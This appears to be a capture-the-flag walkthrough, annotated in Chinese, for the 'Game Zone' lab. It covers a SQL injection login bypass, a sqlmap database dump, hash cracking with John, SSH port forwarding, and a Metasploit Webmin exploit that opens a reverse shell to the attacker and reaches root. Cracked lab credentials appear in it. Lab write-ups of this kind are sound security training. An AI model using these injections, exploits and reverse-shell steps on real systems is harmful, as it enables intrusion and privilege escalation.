# game zone 


## Task1
```
Agent 47
```

## Task2

username :'or 1=1#
pass = 

```
portal.php
```



## Task3
使用BurpSuite攔截對搜索功能的請求

* req.txt
```
POST /portal.php HTTP/1.1
Host: 10.10.201.25
Content-Length: 11
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.201.25
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.201.25/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=17fnmcj6a6aqmuv9nejejm0ji1
Connection: close

searchitem=
```     

run `sqlmap -r req.txt --dbms==mysql --dump`     
```
-r使用你之前保存的截獲請求
--dbms告訴 SQLMap 它是什麼類型的數據庫管理系統
--dump嘗試輸出整個數據庫
```



## Task4
### john

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256      
```
hash.txt - 包含您的哈希列表（在您的情況下，它只有 1 個哈希）
--wordlist - 是您用於查找去哈希值的單詞列表
--format - 是使用的哈希算法。在我們的例子中，它使用 SHA256 進行哈希處理。
```
ssh
```
┌──(root💀kali)-[/home/kali/Desktop]
└─# ssh agent47@10.10.201.25             
The authenticity of host '10.10.201.25 (10.10.201.25)' can't be established.
ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.201.25' (ED25519) to the list of known hosts.
agent47@10.10.201.25's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt

```

## Task5
```
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp   UNCONN     0      0        *:68                   *:*                  
udp   UNCONN     0      0        *:10000                *:*                  
tcp   LISTEN     0      80     127.0.0.1:3306                 *:*                  
tcp   LISTEN     0      128      *:10000                *:*                  
tcp   LISTEN     0      128      *:22                   *:*                  
tcp   LISTEN     0      128     :::80                  :::*                  
tcp   LISTEN     0      128     :::22                  :::*   
```

反向 SSH 端口轉髮指定將遠程服務器主機上的給定端口轉發到本地端的給定主機和端口。

-L是本地隧道（YOU <-- CLIENT）。如果站點被阻止，您可以將流量轉發到您擁有的服務器並查看它。例如，如果 imgur 在工作中被阻止，您可以執行 ssh -L 9000:imgur.com:80 user@example.com。轉到您機器上的 localhost:9000 ，將使用您的其他服務器加載 imgur 流量。

-R是一個遠程隧道（YOU --> CLIENT）。您將流量轉發到其他服務器以供其他人查看

kali 
```
┌──(kali㉿kali)-[~]
└─$ ssh -L 8888:localhost:10000 agent47@10.10.201.25                   130 ⨯
agent47@10.10.201.25's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sun Jan 23 08:46:57 2022 from 10.9.1.236


```
google loaclhost:8888


login 
username:agent47
pass:videogamer124

## Task6
search webmin
use exploit/unix/webapp/webmin_show_cgi_exec

```
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options 

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:p
                                        ort[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://git
                                        hub.com/rapid7/metasploit-framework
                                        /wiki/Using-Metasploit
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME                   yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580


msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set password videogamer124
password => videogamer124
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rport 8888
rport => 8888
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set ssl false 
[!] Changing the SSL option's value may require changing RPORT!
ssl => false
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set username agent47
username => agent47
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run

[-] Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts localhost
rhosts => localhost
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
[*] Exploiting target 0.0.0.1

[-] Exploit failed: A payload has not been selected.
[*] Exploiting target 127.0.0.1
[-] Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.

```

set payload 
```
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show payloads
                                                                                                                                                                                                                                           
Compatible Payloads                                                                                                                                                                                                                        
===================                                                                                                                                                                                                                        
                                                                                                                                                                                                                                           
   #   Name                                        Disclosure Date  Rank    Check  Description                                                                                                                                             
   -   ----                                        ---------------  ----    -----  -----------                                                                                                                                             
   0   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)                                                                                                                 
   1   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6                                                                                                            
   2   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)                                                                                                                 
   3   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6                                                                                                            
   4   payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution                                                                                                                 
   5   payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)                                                                                                         
   6   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)                                                                                                            
   7   payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)                                                                                                              
   8   payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)                                                                                                          
   9   payload/cmd/unix/reverse_python                              normal  No     Unix Command Shell, Reverse TCP (via Python)                                                                                                            
   10  payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)                                                                                                              
   11  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)                                                                                                          
   12  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)                                                                                                     
                                                                                                                                                                                                                                           
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload payload/cmd/unix/reverse                                                                                                                                                      
payload => cmd/unix/reverse                                                                                                                                                                                                                
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options                                                                                                                                                                              
                                                                                                                                                                                                                                           
Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    localhost        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     8888             yes       The target port (TCP)
   SSL       false            yes       Use SSL
   USERNAME  agent47          yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580


msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost 10.9.1.236
lhost => 10.9.1.236
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP double handler on 10.9.1.236:4444 
[*] Attempting to login...
[-] Authentication failed
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP double handler on 10.9.1.236:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 1VwW4pH6mbTMD35T;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "1VwW4pH6mbTMD35T\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.9.1.236:4444 -> 10.10.201.25:42192 ) at 2022-01-23 10:07:50 -0500
[*] Session 1 created in the background.
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 1
[*] Starting interaction with 1...

whoami
root
python -c 'import pty;pty.spawn("/bin/bash")'
root@gamezone:/usr/share/webmin/file/# 

```